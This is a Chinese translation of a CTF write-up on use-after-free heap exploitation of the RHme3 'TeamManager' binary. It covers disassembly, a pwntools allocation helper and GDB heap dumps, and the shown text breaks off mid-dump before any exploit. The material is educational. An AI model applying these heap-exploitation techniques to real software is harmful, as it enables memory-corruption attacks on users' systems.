# 【技术分享】堆利用——UAF之殇
|
##### 译文声明
本文是翻译文章，文章来源：0x00sec.org
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[天鸽](http://bobao.360.cn/member/contribute?uid=145812086)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**前言**
距离我上次的 CTF write-up 已经很久了。主要原因是我正在努力掌握堆利用的方法。我将使用 **RHme3** CTF
的一个二进制文件来展示一种现代化的基于堆的二进制漏洞利用方法。要想掌握堆利用，一篇 write-up 是不够的，我在下面列出了一些资源，可以帮助你掌握
malloc 和 free 等的算法。请记住，堆利用是很困难的，不要期望能在前十到二十次尝试之前掌握它。
**Glibc Malloc Internals**
**Heap Exploitation**
**二进制文件回顾**
首先运行二进制文件。
    Welcome to your TeamManager (TM)!
    0.- Exit
    1.- Add player
    2.- Remove player
    3.- Select player
    4.- Edit player
    5.- Show player
    6.- Show team
    Your choice:
我们看到了上面的菜单。一般来说，CTF 中大多数的堆 pwnable 都是一个菜单驱动的二进制文件。
弄清楚二进制文件的功能后，得出下面的结论：
为了组建一个球队，我们要先创建球员。每个球员都是这样的一个结构体。
    struct player {
         int32_t attack_pts;
         int32_t defense_pts;
         int32_t speed;
         int32_t precision;
         char *name;
    }
我们可以显示、转储和编辑球队或球员的信息。
我们可以从球队中删除球员。
为了能执行上面两个操作，我们需要先通过输入一个索引来选择球员。这一点很重要。
下面我们开始反汇编。
**  
**
**逆向工程**
我将专注于二进制文件的核心功能。
**球员分配：**
堆 pwnable 的 go-to 函数用于给对象分配内存。（在这里指一个球员）。
**提示 1** ：请注意，我们不需要对整个二进制文件进行逆向。通过静态分析快速地了解二进制文件，然后大部分时间都在动态分析。
**提示 2** ：大多数基于堆的二进制文件需要跟踪动态分配的对象。为了做到这一点，通常有一个全局的结构体指针数组。
在 addPlayer 函数的开头我们得到了两行汇编代码：
    00401848  mov     rax, qword [rax*8+0x603180]
    00401850  test    rax, rax
让我们做一些假设。
从地址 0x603180 中我们能读取到的内容取决于 rax 的值。这是典型的数组索引。
正如提示 2 中所说的，程序需要跟踪那些已分配内存的对象。所以这里会包含一个对该数组值的内容的检查，以确定其是否为空（NULL）。
由于它是一个内存分配函数，它很可能先给一个新对象分配内存，然后将其指针存储在某个数组索引中，索引的值取决于检查的结果。
在函数的最后且退出之前有下面这行代码：
    00401af8  mov     qword [rax*8+0x603180], rdx
它使用了相同的索引方法，但这次在索引指向的条目中存入的是 rax 的值。我认为对象分配的执行方式如下：
检查全局数组中是否有可用于分配的条目。
如果检查的结果是有，则向用户询问球员的信息。
用户输入后，把新分配球员的地址存入全局数组。
**球员选择：**
在启动 GDB 之前，我们来看一下球员选择的函数。直觉告诉我，这里可能有一个 bug。
    00401c8b  mov     eax, dword [rbp-0x14]
    00401c8e  mov     rax, qword [rax*8+0x603180]
    00401c96  mov     qword [rel selected], rax
eax 寄存器从偏移 rbp-0x14 处的局部变量中获得值。
eax 确实是作为该全局数组的索引。
rax 保存了该数组元素的内容（在这里指球员对象的地址），并且 eax 被存储在另一个被称作 selected 的全局变量的地址中。
虽然该二进制文件不是 stripped 的，但在 stripped 的情况下，也是一样的。
**  
**
**动态分析**
首先，我们来看看球员分配在 GDB 中是怎样执行的。
    def alloc(name, attack = 1, 
              defense = 2, speed = 3, precision = 4):
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('name: ')
        p.sendline(name)
        p.recvuntil('points: ')
        p.sendline(str(attack))
        p.recvuntil('points: ')
        p.sendline(str(defense))
        p.recvuntil('speed: ')
        p.sendline(str(speed))
        p.recvuntil('precision: ')
        p.sendline(str(precision))
        return
    def pwn():
        alloc('A'*0x60)
                                  (gdb) x/80gx 0x604000
           actual player chunk --> 0x604000:    0x0000000000000000    0x0000000000000021
    Pointer returned by malloc --> 0x604010:    0x0000000200000001    0x0000000400000003
           player's name chunk --> 0x604020:    0x0000000000604030    0x0000000000000071
                                   0x604030:    0x4141414141414141    0x4141414141414141
                                   0x604040:    0x4141414141414141    0x4141414141414141
                                   0x604050:    0x4141414141414141    0x4141414141414141
                                   0x604060:    0x4141414141414141    0x4141414141414141
                                   0x604070:    0x4141414141414141    0x4141414141414141
                                   0x604080:    0x4141414141414141    0x4141414141414141
                     top chunk --> 0x604090:    0x0000000000000000    0x0000000000020f71
在这里我们分配了一个新的球员。从上图中可以看出，球员对象默认被分配的大小为 0x20（最后一位被设置时表示前一个 chunk
正在使用中），对象的名字（大小为 0x60）被一个 malloc 指针指向的一个新分配的 chunk 专门存储。
让我们继续下一次分配。
    alloc('B'*0x60)
    (gdb) x/80gx 0x604000
    0x604000:    0x0000000000000000    0x0000000000000021  <-- player 0
    0x604010:    0x0000000200000001    0x0000000400000003
    0x604020:    0x0000000000604030    0x0000000000000071
    0x604030:    0x4141414141414141    0x4141414141414141
    0x604040:    0x4141414141414141    0x4141414141414141
    0x604050:    0x4141414141414141    0x4141414141414141
    0x604060:    0x4141414141414141    0x4141414141414141
    0x604070:    0x4141414141414141    0x4141414141414141
    0x604080:    0x4141414141414141    0x4141414141414141
    0x604090:    0x0000000000000000    0x0000000000000021 <-- player 1
    0x6040a0:    0x0000000200000001    0x0000000400000003
    0x6040b0:    0x00000000006040c0    0x0000000000000071
    0x6040c0:    0x4242424242424242    0x4242424242424242
    0x6040d0:    0x4242424242424242    0x4242424242424242
    0x6040e0:    0x4242424242424242    0x4242424242424242
    0x6040f0:    0x4242424242424242    0x4242424242424242
    0x604100:    0x4242424242424242    0x4242424242424242
    0x604110:    0x4242424242424242    0x4242424242424242
    0x604120:    0x0000000000000000    0x0000000000020ee1 <-- top chunk
因为数组索引从 0 开始，所以我使用球员 0 作为第一个球员，以此类推。
    alloc('C'*0x80)
    alloc('D'*0x80)
    (gdb) x/90gx 0x604000
    0x604000:    0x0000000000000000    0x0000000000000021 <-- player 0
    0x604010:    0x0000000200000001    0x0000000400000003
    0x604020:    0x0000000000604030    0x0000000000000071
    0x604030:    0x4141414141414141    0x4141414141414141
    0x604040:    0x4141414141414141    0x4141414141414141
    0x604050:    0x4141414141414141    0x4141414141414141
    0x604060:    0x4141414141414141    0x4141414141414141
    0x604070:    0x4141414141414141    0x4141414141414141
    0x604080:    0x4141414141414141    0x4141414141414141
    0x604090:    0x0000000000000000    0x0000000000000021 <-- player 1
    0x6040a0:    0x0000000200000001    0x0000000400000003
    0x6040b0:    0x00000000006040c0    0x0000000000000071
    0x6040c0:    0x4242424242424242    0x4242424242424242
    0x6040d0:    0x4242424242424242    0x4242424242424242
    0x6040e0:    0x4242424242424242    0x4242424242424242
    0x6040f0:    0x4242424242424242    0x4242424242424242
    0x604100:    0x4242424242424242    0x4242424242424242
    0x604110:    0x4242424242424242    0x4242424242424242
    0x604120:    0x0000000000000000    0x0000000000000021 <-- player 2
    0x604130:    0x0000000200000001    0x0000000400000003
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x4343434343434343    0x4343434343434343
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x0000000000000000    0x0000000000000021 <-- player 3
    0x6041e0:    0x0000000200000001    0x0000000400000003
    0x6041f0:    0x0000000000604200    0x0000000000000091
    0x604200:    0x4444444444444444    0x4444444444444444
    0x604210:    0x4444444444444444    0x4444444444444444